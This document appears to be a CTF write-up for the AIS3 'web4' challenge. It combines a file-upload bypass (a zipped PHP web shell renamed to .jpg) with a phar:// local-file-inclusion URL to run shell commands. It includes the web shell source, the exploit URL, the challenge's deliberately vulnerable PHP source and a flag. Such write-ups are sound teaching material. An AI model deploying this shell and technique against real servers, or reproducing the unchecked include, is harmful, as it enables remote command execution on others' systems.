@@ -1,0 +1,171 @@
+https://quiz.zoolab.org:23545/?p=phar://images/211.21.22.144/twaOes1rk.jpg/cmd&cmd=ls%20-al
+
+ais3 web4 note!
+9/1 Gamepire from NCU ADLab
+
+In web3 we know there exite a LFI issue in this website and find an upload page.
+
+So let's combine fileupload attack and LFI!
+
+First we make a web shell cmd.php
+<?php
+print( 'Here is web shell!' );
+if(isset($_REQUEST['cmd'])){
+	echo "<pre>";
+	$cmd = ($_REQUEST['cmd']);
+	system($cmd);
+	echo "</pre>";
+	die;
+}
+?>
+
+Then compress our web shell into ccmd.zip file
+
+Change the .zip subname into .jpg in order to let the file upload
+
+After we upload our ccmd.zip file we found that the site put our file into:
+images/211.21.22.144/twaOes1rk.jpg
+
+Finally we can use php wrapper phar:// ->
+phar://filepath/filename.jpg/shellname&shellinput=commend
+(php wrapper? ->https://www.webmasterworld.com/php/4126270.htm
+                http://php.net/manual/en/wrappers.php)
+
+ok in the end, our url will be looklike:
+
+https://quiz.zoolab.org:23545/?p=phar://images/211.21.22.144/twaOes1rk.jpg/cmd&cmd=ls%20-al
+
+Done!
+
+Becareful! After typing the .../xx.jpg/shellname we should use & to send our
+argument to webshell!
+
+---------------------------------------------------------------------------------
+source code of index.php
+
+<?php
+// flag1: AIS3{Cute_Snoopy_is_back!!?!?!!?}
+
+
+// disabled for security issue
+$blacklist = ["http", "ftp", "data", "zip"];
+foreach ($blacklist as &$s)
+    stream_wrapper_unregister($s);
+
+$FROM_INCLUDE = true;
+
+$pages = array(
+    // disabled
+    // "uploaddddddd" => "Uploads",
+    "about" => "About"
+);
+
+if (isset($_GET["p"]))
+    $p = $_GET["p"];
+else
+    $p = "home";
+
+
+if(strlen($p) > 100)
+{
+    die("parameter is too long");
+}
+
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+<?php
+include "header.php";
+include $p . ".php";
+?>
+<footer class="footer">
+    <p>Â© cebrusfs 2017</p>
+</footer>
+</body>
+</html>
+
+
+---------------------------------------------------------------------------------
+
+source code of upload.php
+<?php
+if (! $FROM_INCLUDE)
+    exit('not allow direct access');
+
+function RandomString()
+{
+    $characters = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
+    $randstring = "";
+    for ($i = 0; $i < 9; $i++) {
+        $randstring .= $characters[rand(0, strlen($characters)-1)];
+    }
+    return $randstring;
+}
+
+$target_dir = "images";
+$uploadOk = false;
+if(isset($_FILES["fileToUpload"]))
+{
+    $filename = basename($_FILES['fileToUpload']['name']);
+    $imageFileType = pathinfo($filename, PATHINFO_EXTENSION);
+    if($imageFileType == "jpg")
+    {
+        $uploadOk = 1;
+    }
+    else
+    {
+        echo "<center><p>Sorry,we only accept jpg file</p></center>";
+        $uploadOk = 0;
+    }
+
+    $fsize = $_FILES['fileToUpload']['size'];
+    if(!($fsize >= 0 && $fsize <= 200000))
+    {
+        $uploadOk = 0;
+        echo "<center><p>Sorry, the size too large.</p></center>";
+    }
+}
+
+if($uploadOk)
+{
+    $ip = $_SERVER["REMOTE_ADDR"];
+
+    $dir = "$target_dir/$ip";
+    if(!is_dir($dir))
+        mkdir($dir);
+
+    $newid = RandomString();
+    $newpath = "$dir/$newid.jpg";
+    if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $newpath))
+    {
+        header("Location: $newpath");
+        exit();
+    }
+    else
+    {
+        echo "<center><p>Something bad happend, please contact the AIS3 admin to solve this</p></center>";
+    }
+}
+?>
+
+<!-- Page Content -->
+<div class="container">
+    <!-- Marketing Icons Section -->
+    <div class="row">
+        <form method="POST" enctype="multipart/form-data">
+            <div class="form-group">
+                <label class="control-label">Select a good Snoopy picture (JPG only)</label>
+                <input id="input-1" name="fileToUpload" type="file" class="file">
+            </div>
+        </form>
+    </div>
+    <script>
+    // initialize with defaults
+    $("#input-1").fileinput();
+
+    // with plugin options
+    $("#input-1").fileinput({'showUpload':false, 'previewFileType':'any'});
+    </script>
+</div>
+
